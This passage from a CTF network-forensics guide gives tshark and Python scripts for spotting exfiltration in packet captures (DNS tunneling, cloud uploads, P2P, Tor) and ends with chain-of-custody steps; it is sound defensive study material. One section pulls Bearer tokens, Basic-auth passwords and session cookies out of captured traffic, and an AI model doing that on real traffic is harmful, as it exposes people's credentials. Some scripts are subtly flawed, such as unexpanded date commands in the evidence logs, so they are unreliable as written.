        ip_len = int(parts[4]) if parts[4] else 0
        data_hex = parts[5]
        
        key = (src, dst, ip_id)
        fragments[key].append({
            'offset': frag_offset,
            'length': ip_len,
            'data': data_hex
        })

## Reassemble fragmented datagrams
print("Fragmented transfers:")
for key, frags in fragments.items():
    if len(frags) > 1:
        src, dst, ip_id = key
        total_size = sum(f['length'] for f in frags)
        print(f"\n{src} → {dst} (ID: {ip_id}): {len(frags)} fragments, total {total_size} bytes")
        
        ## Sort by offset and concatenate
        frags.sort(key=lambda x: x['offset'])
        reassembled = b''
        for frag in frags:
            if frag['data']:
                reassembled += bytes.fromhex(frag['data'])
        
        print(f"Reassembled: {reassembled[:100].hex()}")
        
        ## Check for flag patterns
        if b'flag' in reassembled.lower():
            print(f"✓ Contains 'flag': {reassembled}")
EOF
```

### Covert Channel Detection via Timing

Data may be exfiltrated via inter-packet timing or packet count patterns (timing side-channel):

```bash
## Analyze packet inter-arrival times
tshark -r challenge.pcap -Y "tcp.port == 443" -T fields -e frame.time_delta -e tcp.len | head -50

python3 << 'EOF'
import subprocess
import statistics

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'tcp', '-T', 'fields', '-e', 'frame.time_delta', '-e', 'tcp.srcport', '-e', 'tcp.dstport'],
                       capture_output=True, text=True)

timing_patterns = {}

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 3:
        try:
            time_delta = float(parts[0])
            src_port = parts[1]
            dst_port = parts[2]
            
            key = f"{src_port} → {dst_port}"
            if key not in timing_patterns:
                timing_patterns[key] = []
            
            timing_patterns[key].append(time_delta)
        except:
            pass

## Detect abnormal timing patterns (potential covert channel)
print("Timing analysis (detecting potential covert channels):")
for connection, timings in timing_patterns.items():
    if len(timings) > 10:
        mean = statistics.mean(timings)
        stdev = statistics.stdev(timings) if len(timings) > 1 else 0
        min_t = min(timings)
        max_t = max(timings)
        
        ## High variance or bimodal distribution suggests encoding
        if stdev > 0.1 or (max_t / min_t > 10 and min_t > 0):
            print(f"\n{connection}:")
            print(f"  Packets: {len(timings)}")
            print(f"  Mean delta: {mean:.4f}s, StdDev: {stdev:.4f}s")
            print(f"  Range: {min_t:.4f}s - {max_t:.4f}s")
            print(f"  ⚠ Abnormal timing pattern detected")
EOF
```

### DNS Tunneling Detection

Data exfiltrated via DNS query names or TXT records:

```bash
## Long DNS queries (may contain encoded data)
tshark -r challenge.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | awk 'length > 100 {print}' | head -10

## Extract query name patterns
tshark -r challenge.pcap -Y "dns" -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -20

## DNS TXT record exfiltration
tshark -r challenge.pcap -Y "dns.txt" -T fields -e dns.txt

python3 << 'EOF'
import subprocess
import base64

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'dns', '-T', 'fields', '-e', 'dns.qry.name', '-e', 'dns.txt'],
                       capture_output=True, text=True)

dns_data = []

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    
    ## Extract query names
    if len(parts) >= 1 and parts[0]:
        qry = parts[0]
        
        ## Check for base64 in subdomain
        labels = qry.split('.')
        for label in labels:
            if len(label) > 16 and all(c.isalnum() or c in '+/=' for c in label):
                try:
                    decoded = base64.b64decode(label)
                    if b'flag' in decoded.lower():
                        print(f"✓ DNS query contains flag: {label} → {decoded}")
                except:
                    pass
    
    ## Extract TXT records
    if len(parts) >= 2 and parts[1]:
        txt = parts[1]
        
        ## Try hex decode
        if all(c in '0123456789abcdefABCDEF' for c in txt):
            try:
                decoded = bytes.fromhex(txt).decode()
                if 'flag' in decoded.lower():
                    print(f"✓ DNS TXT contains flag: {decoded}")
            except:
                pass
EOF
```

---

## Cloud Service Usage

Attackers exfiltrate data via legitimate cloud services (AWS S3, Google Drive, Dropbox, etc.). CTF challenges may hide flags in cloud service traffic or configuration.

### Cloud Storage Service Detection

Identify HTTP/HTTPS connections to cloud providers:

```bash
## Extract all HTTPS SNI values (Server Name Indication)
tshark -r challenge.pcap -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name | sort -u

## Detect cloud provider domains
python3 << 'EOF'
import subprocess

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'tls', '-T', 'fields', '-e', 'tls.handshake.extensions_server_name'],
                       capture_output=True, text=True)

cloud_services = {
    'amazonaws.com': 'AWS',
    's3.amazonaws.com': 'AWS S3',
    'dropbox.com': 'Dropbox',
    'drive.google.com': 'Google Drive',
    'onedrive.live.com': 'OneDrive',
    'box.com': 'Box',
    'mega.nz': 'MEGA',
    'app.slack.com': 'Slack',
    'discord.com': 'Discord',
    'telegram.org': 'Telegram',
}

detected_services = set()

for line in result.stdout.strip().split('\n'):
    if not line:
        continue
    
    for service_domain, service_name in cloud_services.items():
        if service_domain in line.lower():
            detected_services.add((service_name, line))
            print(f"✓ {service_name}: {line}")

if not detected_services:
    print("No known cloud services detected in TLS handshakes")
EOF
```

### AWS S3 Bucket Access Analysis

S3 traffic uses HTTP/HTTPS with distinctive URL patterns:

```bash
## S3 bucket and object requests
tshark -r challenge.pcap -Y "http.host contains 's3'" -T fields -e http.request.full_uri

## Extract S3 API calls
tshark -r challenge.pcap -Y "http" -T fields -e http.request.method -e http.request.full_uri | grep -i "s3\|amazonaws"

python3 << 'EOF'
import subprocess
import re

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'http', '-T', 'fields', '-e', 'http.request.full_uri', '-e', 'http.request.method', '-e', 'data.data'],
                       capture_output=True, text=True)

s3_pattern = re.compile(r'(https?://)?([a-zA-Z0-9\-]+)\.s3[.\-]?([a-zA-Z0-9\-]*\.)?amazonaws\.com/(.+)')

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 2:
        uri = parts[0]
        method = parts[1]
        
        match = s3_pattern.search(uri)
        if match:
            bucket = match.group(2)
            key = match.group(4)
            
            print(f"{method} s3://{bucket}/{key}")
            
            ## GET requests retrieve data
            if method == 'GET':
                print(f"  → Data retrieval (exfiltration)")
            ## PUT/POST upload data
            elif method in ['PUT', 'POST']:
                print(f"  → Data upload")
EOF
```

### HTTP Multipart Form Data (Cloud Service Uploads)

File uploads to cloud services use multipart form encoding:

```bash
## Identify multipart form submissions
tshark -r challenge.pcap -Y "http.content_type contains 'multipart'" -T fields -e http.request.full_uri -e http.content_type

## Extract form data
python3 << 'EOF'
import subprocess
import re

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'http.request', '-V'],
                       capture_output=True, text=True)

current_form = None
boundary = None

for line in result.stdout.split('\n'):
    ## Detect Content-Type: multipart
    if 'multipart/form-data' in line and 'boundary=' in line:
        boundary_match = re.search(r'boundary=([a-zA-Z0-9\-]+)', line)
        if boundary_match:
            boundary = boundary_match.group(1)
            print(f"Multipart form detected, boundary: {boundary}")
    
    ## Extract form field names
    if 'Content-Disposition: form-data' in line and 'name=' in line:
        name_match = re.search(r'name="([^"]+)"', line)
        if name_match:
            field_name = name_match.group(1)
            print(f"  Field: {field_name}")
            
            ## Filename indicates file upload
            if 'filename=' in line:
                file_match = re.search(r'filename="([^"]+)"', line)
                if file_match:
                    filename = file_match.group(1)
                    print(f"    Uploading file: {filename}")
EOF
```

### OAuth and API Token Extraction

Cloud service authentication uses OAuth tokens or API keys:

```bash
## Extract Authorization headers
tshark -r challenge.pcap -Y "http" -T fields -e http.authorization | grep -v "^$"

## Bearer token extraction
tshark -r challenge.pcap -Y "http" -T fields -e http.authorization | grep "Bearer" | head -10

python3 << 'EOF'
import subprocess
import re

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'http.request', '-T', 'fields', '-e', 'http.authorization', '-e', 'http.cookie'],
                       capture_output=True, text=True)

tokens = set()

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    
    ## Extract Authorization headers
    if len(parts) > 0 and parts[0]:
        auth = parts[0]
        if 'Bearer' in auth:
            token = auth.split('Bearer')[-1].strip()
            tokens.add(('Bearer', token))
            print(f"Bearer token: {token[:50]}...")
        elif 'Basic' in auth:
            encoded = auth.split('Basic')[-1].strip()
            import base64
            try:
                decoded = base64.b64decode(encoded).decode()
                print(f"Basic auth: {decoded}")
                tokens.add(('Basic', decoded))
            except:
                pass
    
    ## Extract cookies (may contain session tokens)
    if len(parts) > 1 and parts[1]:
        cookies = parts[1].split(';')
        for cookie in cookies:
            if 'session' in cookie.lower() or 'token' in cookie.lower():
                print(f"Cookie: {cookie}")
EOF
```

### Cloud API Endpoint Anomalies

Unusual API calls or parameters may indicate exfiltration:

```bash
## List all HTTP requests to cloud services
tshark -r challenge.pcap -Y "http.host contains 'api'" -T fields -e http.request.method -e http.request.full_uri

## Frequency of specific endpoints
tshark -r challenge.pcap -Y "http" -T fields -e http.request.full_uri | sed 's/?.*//g' | sort | uniq -c | sort -rn | head -20

python3 << 'EOF'
import subprocess
from collections import defaultdict

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'http', '-T', 'fields', '-e', 'http.request.method', '-e', 'http.request.full_uri'],
                       capture_output=True, text=True)

endpoints = defaultdict(int)

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 2:
        method = parts[0]
        uri = parts[1]
        
        ## Normalize URI (remove query parameters)
        base_uri = uri.split('?')[0]
        endpoints[(method, base_uri)] += 1

## Detect unusual patterns
print("API endpoint frequency (potential exfiltration = high volume):")
for (method, uri), count in sorted(endpoints.items(), key=lambda x: x[1], reverse=True)[:20]:
    if count > 5:
        print(f"{count:3d}x {method} {uri}")
EOF
```

### WebDAV and Collaborative Tool Usage

Some challenges use WebDAV (web-based file sharing) or collaboration tools:

```bash
## WebDAV methods (PROPFIND, MKCOL, etc.)
tshark -r challenge.pcap -Y "http.request.method in {PROPFIND, MKCOL, MOVE, COPY}" -T fields -e http.request.method -e http.request.full_uri

## Collaboration tool traffic (SharePoint, Nextcloud, etc.)
tshark -r challenge.pcap -Y "http.host contains 'sharepoint' or http.host contains 'nextcloud'" -T fields -e http.request.full_uri

## Extract shared documents
python3 << 'EOF'
import subprocess
import re

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'http', '-T', 'fields', '-e', 'http.request.method', '-e', 'http.request.full_uri', '-e', 'http.response.code'],
                       capture_output=True, text=True)

doc_extensions = ['.docx', '.xlsx', '.pptx', '.pdf', '.doc', '.xls', '.ppt', '.txt', '.json', '.csv']

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 2:
        method = parts[0]
        uri = parts[1]
        
        for ext in doc_extensions:
            if ext in uri.lower():
                print(f"{method} {uri}")
                break
EOF
```

---

## Peer-to-Peer Detection

P2P networks enable direct data transfer between compromised hosts, bypassing centralized monitoring. CTF challenges may use P2P protocols (BitTorrent, DHT, etc.) for distributed exfiltration.

### P2P Protocol Identification

Detect BitTorrent, DHT, and other P2P protocols:

```bash
## BitTorrent tracking requests (tracker announce)
tshark -r challenge.pcap -Y "http.request.uri contains 'announce'" -T fields -e http.request.full_uri

## DHT (Distributed Hash Table) traffic on UDP 6881-6889
tshark -r challenge.pcap -Y "udp.dstport >= 6881 and udp.dstport <= 6889" -T fields -e ip.src -e ip.dst -e data.data

## IPFS (InterPlanetary File System) detection
tshark -r challenge.pcap -Y "tcp.port == 4001 or tcp.port == 5001" -T fields -e tcp.srcport -e tcp.dstport

python3 << 'EOF'
import subprocess

## Check for BitTorrent protocol signature
result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-T', 'fields', '-e', 'data.data'],
                       capture_output=True, text=True)

bittorrent_detected = False
ipfs_detected = False

for line in result.stdout.strip().split('\n'):
    if not line:
        continue
    
    try:
        data = bytes.fromhex(line)
        
        ## BitTorrent protocol handshake: \x13BitTorrent protocol
        if b'\x13BitTorrent protocol' in data:
            print("✓ BitTorrent protocol handshake detected")
            bittorrent_detected = True
        
        ## DHT ping/find_node (Krpc protocol)
        if data.startswith(b'd1:ad') or data.startswith(b'd1:y'):
            print("✓ DHT/Kademlia protocol detected")
        
        ## IPFS (libp2p) magic bytes
        if data.startswith(b'\x00\x01\x00\x00'):
            print("✓ IPFS/libp2p protocol detected")
            ipfs_detected = True
    except:
        pass
EOF
```

### BitTorrent Peer Discovery

Extract peer lists and torrent metadata:

```bash
## Tracker HTTP requests
tshark -r challenge.pcap -Y "http.request.uri contains 'announce' or http.request.uri contains 'scrape'" -T fields -e http.request.full_uri

## Extract torrent info from tracker responses (bencoded)
python3 << 'EOF'
import subprocess
import re

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'http.response', '-T', 'fields', '-e', 'data.data'],
                       capture_output=True, text=True)

def parse_bencode(data):
    """Parse bencoded data (simple version)"""
    ## BitTorrent uses bencoding: d=dict, l=list, i=int, string=raw bytes
    if not data:
        return None
    
    try:
        ## Look for peer list (usually "peers" key)
        if b'peers' in data:
            start = data.find(b'peers') + 5
            ## Extract raw peer data (12 bytes per peer: 4 IP + 2 port)
            if data[start:start+1] == b':':
                length_end = data.find(b':', start + 1)
                length = int(data[start+1:length_end])
                peers_data = data[length_end+1:length_end+1+length]
                
                ## Parse IP:port pairs
                peers = []
                for i in range(0, len(peers_data), 6):
                    ip_bytes = peers_data[i:i+4]
                    port_bytes = peers_data[i+4:i+6]
                    
                    ip = '.'.join(str(b) for b in ip_bytes)
                    port = int.from_bytes(port_bytes, 'big')
                    peers.append(f"{ip}:{port}")
                
                return peers
    except:
        pass
    
    return None

for line in result.stdout.strip().split('\n'):
    if not line:
        continue
    
    try:
        data = bytes.fromhex(line)
        peers = parse_bencode(data)
        
        if peers:
            print(f"✓ Tracker response contains {len(peers)} peers:")
            for peer in peers[:10]:
                print(f"  {peer}")
    except:
        pass
EOF
```

### DHT Network Participation

DHT enables decentralized peer lookup without central tracker:

```bash
## DHT node communication (Kademlia protocol)
tshark -r challenge.pcap -Y "udp.dstport == 6881 or udp.dstport == 6881" -T fields -e ip.src -e ip.dst -e udp.srcport -e udp.dstport -e data.data

python3 << 'EOF'
import subprocess
import re

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'udp', '-T', 'fields', '-e', 'data.data'],
                       capture_output=True, text=True)

dht_messages = []

for line in result.stdout.strip().split('\n'):
    if not line:
        continue
    
    try:
        data = bytes.fromhex(line)
        
        ## DHT messages are bencoded: d1:xX... format
        if data.startswith(b'd1:'):
            ## Parse DHT packet structure
            ## y = message type (q=query, r=response, e=error)
            ## t = transaction ID
            ## a = arguments
            
            dht_messages.append(data)
            
            ## Extract message type
            y_start = data.find(b'1:y')
            if y_start >= 0:
                msg_type = data[y_start+3:y_start+4]
                
                ## Extract transaction ID
                t_start = data.find(b'1:t')
                if t_start >= 0:
                    t_len_end = data.find(b':', t_start + 3)
                    t_length = int(data[t_start+3:t_len_end])
                    trans_id = data[t_len_end+1:t_len_end+1+t_length]
                    
                    msg_type_names = {b'q': 'Query', b'r': 'Response', b'e': 'Error'}
                    print(f"DHT {msg_type_names.get(msg_type, b'?'.decode())}: transaction {trans_id.hex()}")
    except:
        pass
EOF
```

### Direct P2P File Transfer Detection

Direct peer connections (outside tracker) indicate file sharing:

```bash
## Identify direct peer connections (non-HTTP, non-standard ports)
tshark -r challenge.pcap -Y "tcp.flags.syn == 1" -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport | grep -vE ":80$|:443$|:22$|:21$|:25$|:53$"

# Large data transfers on non-standard ports (potential P2P)
python3 << 'EOF'
import subprocess
from collections import defaultdict

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'tcp', '-T', 'fields', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'tcp.dstport', '-e', 'tcp.len'],
                       capture_output=True, text=True)

connections = defaultdict(lambda: {'packet_count': 0, 'total_bytes': 0})

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 4:
        src = parts[0]
        dst = parts[1]
        port = parts[2]
        tcp_len = int(parts[3]) if parts[3] else 0
        
        # Standard services
        standard_ports = {20, 21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 5432}
        
        if int(port) not in standard_ports:
            key = (src, dst, port)
            connections[key]['packet_count'] += 1
            connections[key]['total_bytes'] += tcp_len

# Identify potential P2P (high volume on non-standard port)
print("Non-standard port connections (potential P2P):")
for (src, dst, port), stats in sorted(connections.items(), key=lambda x: x[1]['total_bytes'], reverse=True):
    if stats['total_bytes'] > 10000:  # > 10KB threshold
        print(f"{src} → {dst}:{port} | {stats['packet_count']} packets, {stats['total_bytes']} bytes")
EOF
```

## IPFS Hash and Content Tracking

IPFS uses content-addressed hashing. Extract and track shared content:

```bash
# IPFS daemon communication (port 5001 HTTP API, port 4001 swarm)
tshark -r challenge.pcap -Y "tcp.port == 5001 or tcp.port == 4001" -T fields -e http.request.full_uri -e data.data

# IPFS content hash (Qm... base58 encoding)
tshark -r challenge.pcap -T fields -e data.data | strings | grep -E "^Qm[a-zA-Z0-9]{44,}"

python3 << 'EOF'
import subprocess
import re

# Extract IPFS hashes from all payloads
result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-T', 'fields', '-e', 'data.data'],
                       capture_output=True, text=True)

ipfs_hashes = set()

for line in result.stdout.strip().split('\n'):
    if not line:
        continue
    
    try:
        # Convert hex to ASCII for searching
        data = bytes.fromhex(line)
        text = data.decode(errors='ignore')
        
        # IPFS hashes: Qm followed by 44 base58 characters
        matches = re.findall(r'(Qm[1-9A-HJ-NP-Za-km-z]{44})', text)
        for match in matches:
            ipfs_hashes.add(match)
            print(f"✓ IPFS hash: {match}")
    except:
        pass

# IPFS cat/get request patterns
result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'http', '-T', 'fields', '-e', 'http.request.full_uri'],
                       capture_output=True, text=True)

for line in result.stdout.strip().split('\n'):
    if '/ipfs/' in line or '/ipns/' in line:
        print(f"IPFS access: {line}")
EOF
```

## Blockchain Transaction Detection

Cryptocurrencies and blockchain networks may be used for data exfiltration:

```bash
# Bitcoin network traffic (port 8333)
tshark -r challenge.pcap -Y "tcp.dstport == 8333" -T fields -e ip.src -e ip.dst

# Ethereum RPC calls (port 8545)
tshark -r challenge.pcap -Y "tcp.dstport == 8545 or tcp.port == 8545" -T fields -e http.request.full_uri

# Generic blockchain protocol detection
python3 << 'EOF'
import subprocess

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-T', 'fields', '-e', 'data.data'],
                       capture_output=True, text=True)

blockchain_patterns = {
    'Bitcoin': [b'\x00\x12\x54\x01', b'bitcoin'],  # Bitcoin protocol magic
    'Ethereum': [b'jsonrpc', b'eth_', b'0x'],      # Ethereum RPC
    'Monero': [b'\x11\x01\x01', b'monero'],         # Monero protocol
}

for line in result.stdout.strip().split('\n'):
    if not line:
        continue
    
    try:
        data = bytes.fromhex(line)
        
        for blockchain, patterns in blockchain_patterns.items():
            for pattern in patterns:
                if pattern in data:
                    print(f"✓ {blockchain} detected in packet")
                    break
    except:
        pass
EOF
```

## Decentralized Storage Network Analysis

Analyze Filecoin, Arweave, and similar decentralized storage:

```bash
# Filecoin bootstrap node communication
tshark -r challenge.pcap -Y "tcp.port == 1288 or udp.port == 1288" -T fields -e ip.src -e ip.dst -e data.data

# Arweave network communication (port 1984)
tshark -r challenge.pcap -Y "tcp.dstport == 1984" -T fields -e http.request.full_uri

# Generic DHT swarm detection
python3 << 'EOF'
import subprocess
from collections import defaultdict

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'tcp or udp', '-T', 'fields', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'tcp.dstport', '-e', 'udp.dstport'],
                       capture_output=True, text=True)

peer_connections = defaultdict(int)

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 3:
        src = parts[0]
        dst = parts[1]
        port = parts[2] if parts[2] else parts[3]
        
        # DHT/P2P ports typically high range and diverse
        if port and int(port) > 1024:
            peer_connections[(src, dst)] += 1

# Identify swarm participation (multiple peers)
print("Peer connections (potential swarm participation):")
for (src, dst), count in sorted(peer_connections.items(), key=lambda x: x[1], reverse=True)[:20]:
    if count > 2:
        print(f"{src} ↔ {dst}: {count} connections")
EOF
```

## P2P Application Layer Protocol Analysis

Extract actual P2P application data (file content, metadata, etc.):

```bash
# Follow non-HTTP TCP streams for P2P data
tshark -r challenge.pcap -Y "tcp.port > 1024 and tcp.port != 80 and tcp.port != 443 and tcp.len > 100" -q -z follow,tcp,raw,0 > p2p_stream_0.bin

# Analyze stream content
file p2p_stream_0.bin
hexdump -C p2p_stream_0.bin | head -50
strings p2p_stream_0.bin | grep -i 'flag\|ctf'

python3 << 'EOF'
import os
import subprocess

# Extract all non-standard TCP streams
result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'tcp.port > 1024', '-q', '-z', 'follow,tcp,raw'],
                       capture_output=True, text=True)

# Parse stream output and save individual streams
streams = result.stdout.split('===')
for i, stream in enumerate(streams):
    if stream.strip():
        with open(f'p2p_stream_{i}.txt', 'w') as f:
            f.write(stream)
        
        # Analyze each stream
        if len(stream) > 100:
            lines = stream.split('\n')
            # Look for printable content
            for line in lines:
                if 'flag' in line.lower() or 'ctf' in line.lower():
                    print(f"Stream {i}: {line}")
EOF
```

## Mesh Network Detection

Mesh networks (Batman, Babel, etc.) enable multi-hop communication:

```bash
# OLSR (Optimized Link State Routing) - port 698
tshark -r challenge.pcap -Y "udp.dstport == 698" -T fields -e ip.src -e ip.dst -e data.data

# Batman protocol detection
tshark -r challenge.pcap -T fields -e data.data | while read hex; do
  # Batman packets have specific format
  data=$(echo "$hex" | xxd -r -p 2>/dev/null)
  if echo "$data" | grep -q "^B.A.T."; then
    echo "Batman packet detected: $hex"
  fi
done

python3 << 'EOF'
import subprocess

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-T', 'fields', '-e', 'data.data'],
                       capture_output=True, text=True)

mesh_protocols = {
    'OLSR': b'OLSR',
    'Batman': b'\x01\x00' + b'B.A.T.',  # Batman v15
    'Babel': b'\x42',  # Babel protocol number
}

for line in result.stdout.strip().split('\n'):
    if not line:
        continue
    
    try:
        data = bytes.fromhex(line)
        
        # Simplified detection
        if data.startswith(b'\x01') and len(data) > 100:  # Potential routing protocol
            print(f"Potential mesh protocol packet: {data[:20].hex()}")
    except:
        pass
EOF
```

## Tor and Anonymization Network Detection

Attackers may use Tor for anonymized exfiltration:

```bash
# Tor guard node handshake (TLS with specific fingerprints)
tshark -r challenge.pcap -Y "tls.server_name contains 'onion'" -T fields -e ip.src -e ip.dst

# Tor directory protocol (port 9030)
tshark -r challenge.pcap -Y "tcp.dstport == 9030" -T fields -e http.request.full_uri

# SOCKS5 proxy (port 9050 default Tor)
tshark -r challenge.pcap -Y "tcp.dstport == 9050 or tcp.dstport == 9051" -T fields -e data.data

python3 << 'EOF'
import subprocess

# Detect Tor exit node communication via SSL certificate analysis
result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'tls.handshake.certificate', '-V'],
                       capture_output=True, text=True)

tor_indicators = ['onion', 'exit', 'relay', 'bridge']

for line in result.stdout.split('\n'):
    for indicator in tor_indicators:
        if indicator in line.lower():
            print(f"Potential Tor indicator: {line.strip()}")
            break

# VPN detection (ESP protocol, IKE handshakes)
result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'ip.proto == 50 or ip.proto == 51', '-T', 'fields', '-e', 'ip.src', '-e', 'ip.dst'],
                       capture_output=True, text=True)

vpn_connections = result.stdout.strip().split('\n')
if vpn_connections and vpn_connections[0]:
    print(f"\n✓ VPN/IPSec detected: {len(vpn_connections)} packets")
    for conn in vpn_connections[:5]:
        print(f"  {conn}")
EOF
```

## Cross-Domain P2P Traffic Correlation

Correlate P2P activity across multiple domains and time intervals:

```bash
python3 << 'EOF'
import subprocess
from collections import defaultdict
from datetime import datetime

# Build comprehensive P2P connection graph
result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'tcp or udp', '-T', 'fields', '-e', 'frame.time_epoch', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'tcp.dstport', '-e', 'udp.dstport', '-e', 'ip.len'],
                       capture_output=True, text=True)

# Track peer participation and data volume
peer_graph = defaultdict(lambda: {'connections': set(), 'total_bytes': 0, 'packet_times': []})

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 6:
        try:
            timestamp = float(parts[0])
            src = parts[1]
            dst = parts[2]
            tcp_port = parts[3]
            udp_port = parts[4]
            length = int(parts[5])
            
            port = tcp_port if tcp_port else udp_port
            
            # Standard ports to exclude
            standard_ports = {20, 21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995}
            
            if port and int(port) not in standard_ports:
                peer_graph[src]['connections'].add(dst)
                peer_graph[src]['total_bytes'] += length
                peer_graph[src]['packet_times'].append(timestamp)
        except:
            pass

# Identify hosts with many P2P connections (likely P2P nodes)
print("Potential P2P nodes (multiple non-standard connections):")
for node, data in sorted(peer_graph.items(), key=lambda x: len(x[1]['connections']), reverse=True):
    if len(data['connections']) > 5:
        print(f"\n{node}:")
        print(f"  Peers: {len(data['connections'])}")
        print(f"  Total bytes: {data['total_bytes']}")
        print(f"  Activity span: {data['packet_times'][-1] - data['packet_times'][0]:.1f}s")
        
        # Time-based clustering
        if len(data['packet_times']) > 2:
            intervals = [data['packet_times'][i+1] - data['packet_times'][i] for i in range(len(data['packet_times'])-1)]
            avg_interval = sum(intervals) / len(intervals)
            print(f"  Average packet interval: {avg_interval:.3f}s")
EOF
```

## Swarm Intelligence and Coordinated Exfiltration

Detect coordinated behavior between multiple hosts (botnet or organized P2P):

```bash
python3 << 'EOF'
import subprocess
from collections import defaultdict
import statistics

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'tcp or udp', '-T', 'fields', '-e', 'frame.time_epoch', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'tcp.dstport', '-e', 'udp.dstport'],
                       capture_output=True, text=True)

# Track communication targets (who talks to whom)
comm_targets = defaultdict(set)
target_activity = defaultdict(lambda: {'sources': [], 'times': []})

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 5:
        try:
            timestamp = float(parts[0])
            src = parts[1]
            dst = parts[2]
            
            comm_targets[src].add(dst)
            target_activity[dst]['sources'].append(src)
            target_activity[dst]['times'].append(timestamp)
        except:
            pass

# Identify hosts receiving connections from many sources (potential collectors/aggregators)
print("Potential data aggregation points (receive from many sources):")
for dst, data in sorted(target_activity.items(), key=lambda x: len(set(x[1]['sources'])), reverse=True):
    unique_sources = set(data['sources'])
    if len(unique_sources) > 10:
        print(f"\n{dst}:")
        print(f"  Incoming sources: {len(unique_sources)}")
        print(f"  Total packets: {len(data['sources'])}")
        
        # Check if sources communicate synchronously (coordinated)
        if len(data['times']) > 2:
            time_diffs = [data['times'][i+1] - data['times'][i] for i in range(len(data['times'])-1)]
            if time_diffs:
                try:
                    stdev = statistics.stdev(time_diffs)
                    if stdev < 0.1:  # Low variance = synchronized timing
                        print(f"  ⚠ Synchronized timing pattern (StdDev: {stdev:.4f}) - potential coordination")
                except:
                    pass

# Identify cyclic P2P patterns
print("\n\nCyclic communication patterns (bot-like behavior):")
for src, dests in comm_targets.items():
    if len(dests) > 3:  # Node talks to multiple destinations
        # Check if destinations form a cycle/ring
        dest_list = sorted(list(dests))
        print(f"{src} → {len(dests)} destinations: {dest_list[:5]}")
EOF
```

[Inference] Comprehensive P2P detection requires correlating multiple indicators: non-standard ports, direct peer connections, protocol signatures, and temporal patterns. No single indicator confirms P2P exfiltration; detection strength increases with multiple corroborating factors.

---

# Forensics & Evidence Handling

## PCAP Chain of Custody

Chain of custody (CoC) establishes integrity and admissibility of digital evidence. In CTF forensic challenges, proper documentation prevents evidence contamination and proves non-tampering.

### Initial Evidence Acquisition and Documentation

Capture PCAP files with metadata preservation:

```bash
## Capture with full documentation
sudo tcpdump -i eth0 -w evidence_$(date +%Y%m%d_%H%M%S).pcap -v

## Document capture parameters
cat > capture_log.txt << 'EOF'
Capture Information:
- Interface: eth0
- Start time: $(date -u)
- Duration: [to be filled]
- Capture filter: none (all traffic)
- Snaplen: 65535 bytes
- Operator: [Examiner name]
- Witness: [Observer name]
- Case ID: [Reference number]
EOF
```

Secure immediate acquisition before live system continues operation:

```bash
## Copy to read-only media (after initial capture)
## Step 1: Unmount media if mounted
sudo umount /mnt/evidence

## Step 2: Create forensic image with md5/sha256
sudo dd if=/dev/sdX of=evidence_image.img bs=4M status=progress
md5sum evidence_image.img > evidence_image.img.md5
sha256sum evidence_image.img > evidence_image.img.sha256

## Step 3: Mount as read-only
sudo mount -o ro,noexec,nouser evidence_image.img /mnt/evidence

## Step 4: Extract PCAP from mounted filesystem (if applicable)
sudo cp /mnt/evidence/network_captures/*.pcap /secure/location/

## Step 5: Create evidence seal
cat > EVIDENCE_SEAL.txt << 'EOF'
Evidence Seal Certificate
========================
Item: network_capture.pcap
Acquired: $(date -u)
Operator: [Name]
MD5: $(md5sum /secure/location/network_capture.pcap)
SHA256: $(sha256sum /secure/location/network_capture.pcap)
Sealed by: [Signature]
Time sealed: $(date -u)
EOF
```

### Chain of Custody Log Maintenance

Document every access and handling:

```bash
## Create CoC tracking file
cat > chain_of_custody.log << 'EOF'
CHAIN OF CUSTODY LOG
====================
Evidence: network_capture.pcap
Case Number: 2024-CTF-001
Date Acquired: 2024-10-20

Access Log:
-----------
EOF

## Function to log access
log_access() {
    local examiner=$1
    local action=$2
    local hash=$3
    
    echo "[$(date -u '+%Y-%m-%d %H:%M:%S')] $examiner - $action - Hash: $hash" >> chain_of_custody.log
}

## Example: Log initial hash verification
